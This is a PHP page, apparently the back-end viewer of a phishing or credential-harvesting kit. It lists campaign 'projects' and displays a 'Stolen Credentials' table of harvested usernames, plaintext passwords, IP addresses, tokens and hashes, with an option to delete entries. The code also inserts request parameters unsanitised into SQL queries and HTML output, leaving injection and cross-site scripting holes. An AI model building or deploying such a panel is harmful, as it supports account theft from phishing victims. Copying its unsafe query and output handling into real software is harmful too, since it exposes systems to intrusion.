<HTML>
<HEAD>
<style>
      @import url(https://fonts.googleapis.com/css?family=Roboto:400,500,700,300,100);

body {
  background-color: #1b1e24;
  font-family: "Roboto", helvetica, arial, sans-serif;
  font-size: 24px;
  font-weight: 400;
  text-rendering: optimizeLegibility;
}

div.table-title {
   display: block;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 100%;
}

.table-title h3 {
   color: #fafafa;
   font-size: 20px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}

.table-title h2 {
   color: #fafafa;
   font-size: 26px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}


/*** Table Styles **/

.table-fill {
  background: white;
  border-radius:3px;
  border-collapse: collapse;
  height: 275px;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 75%;
  box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
  animation: float 5s infinite;
}

th {
  color:#FFFFFF;
  background:#d12128;
  border-bottom:4px solid #9ea7af;
  border-right: 1px solid #343a45;
  font-size:20px;
  font-weight: 120;
  padding:16px;
  text-align:center;
  text-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
  vertical-align:middle;
}

th:first-child {
  border-top-left-radius:3px;
}

th:last-child {
  border-top-right-radius:3px;
  border-right:none;
}

tr {
  border-top: 1px solid #C1C3D1;
  border-bottom-: 1px solid #C1C3D1;
  color:#666B85;
  font-size:16px;
  font-weight:normal;
  text-shadow: 0 1px 1px rgba(256, 256, 256, 0.1);
}

tr:hover td {
  background:#4E5066;
  color:#FFFFFF;
  border-top: 1px solid #22262e;
  border-bottom: 1px solid #22262e;
}

tr:first-child {
  border-top:none;
}

tr:last-child {
  border-bottom:none;
}

tr:nth-child(odd) td {
  background:#EBEBEB;
}

tr:nth-child(odd):hover td {
  background:#4E5066;
}

tr:last-child td:first-child {
  border-bottom-left-radius:3px;
}

tr:last-child td:last-child {
  border-bottom-right-radius:3px;
}

td {
  background:#FFFFFF;
  padding:10px;
  text-align:center;
  vertical-align:middle;
  font-weight:300;
  font-size:16px;
  text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
  border-right: 1px solid #C1C3D1;
}

td:last-child {
  border-right: 0px;
}

th.text-center {
  text-align: left;
}

th.text-center {
  text-align: center;
}

th.text-right {
  text-align: right;
}

td.text-center {
  text-align: left;
}

td.text-center {
  text-align: center;
}

td.text-right {
  text-align: right;
}

/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content/Box */
.modal-content {
    background-color: #fefefe;
    margin: 15% auto; /* 15% from the top and centered */
    padding: 20px;
    border: 1px solid #888;
    width: 80%; /* Could be more or less, depending on screen size */
}

/* The Close Button */
.close {
    color: #aaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: black;
    text-decoration: none;
    cursor: pointer;
}

.boxsizingBorder {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
}

textarea
{
  width:100%;
}

td.input input {
    width: 100%;
    box-sizing: border-box;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
}

    </style>
</HEAD>
<BODY>
<CENTER>
<?php

// Read Database Connection Variables
require_once '../dbconfig.php';

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// If the Project is Not Already Selected..
if(!isset($_REQUEST['project'])){

// Show Unique Projects (Not Including Blanks)
$sql1 = "SELECT DISTINCT location FROM stolencreds WHERE location != '';";
$result1 = $conn->query($sql1);
?>

<?php
// Show Project Drop Down Selection
?>
    <h2><font color="#FFFFFF">Select Project</FONT></h2>
<FORM METHOD="POST" ACTION="<?php echo $_SERVER['PHP_SELF'];?>">
<SELECT NAME="project">

<?php
    // output data of each row
    while($row1 = $result1->fetch_assoc()) {
//$pw = $row["pass"];
echo "<option value=\"".$row1["location"]."\">".$row1["location"]."</option>";
    }

?>
</SELECT>
<INPUT TYPE="submit" value="Go!">
</FORM>
<?php
}

// If a Project is Selected Already After Posting to Self...
if(isset($_REQUEST['project'])){ $project = $_REQUEST['project'];

if(isset($_REQUEST['DELETE'])){

$timestamp = $_REQUEST['timestamp'];

// Delete Row From Results
$sqlrm = "DELETE FROM stolencreds WHERE location = '$project' and entered = '$timestamp';";
$resultrm = $conn->query($sqlrm);

}

// Show Credentails for the Selected Project
$sql = "SELECT * FROM stolencreds WHERE location = '$project';";
$result = $conn->query($sql);

?>
    <h2><FONT COLOR="#FFFFFF">Stolen Credentials</FONT></h2>
<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH>Hash</TH><TH>Actions</TH></TR>
<?php
    // output data of each row
    while($row = $result->fetch_assoc()) {
//$pw = $row["pass"];
$inputfields = "<input type=\"hidden\" name=\"project\" value=\"".$project."\"><input type=\"hidden\" name=\"timestamp\" value=\"".$row['entered']."\">";
echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td><td>".$row["Token"]."</td><td>".$row["Hash"]."</td><td><form method=\"post\" action=\"".$_SERVER['PHP_SELF']."\"><input type=\"submit\" value=\"Delete\" name=\"DELETE\">".$inputfields."</td></form></tr>";
    }

printf($conn->error);

}

$conn->close();
?></TABLE>
</CENTER>
</BODY>
</HTML>
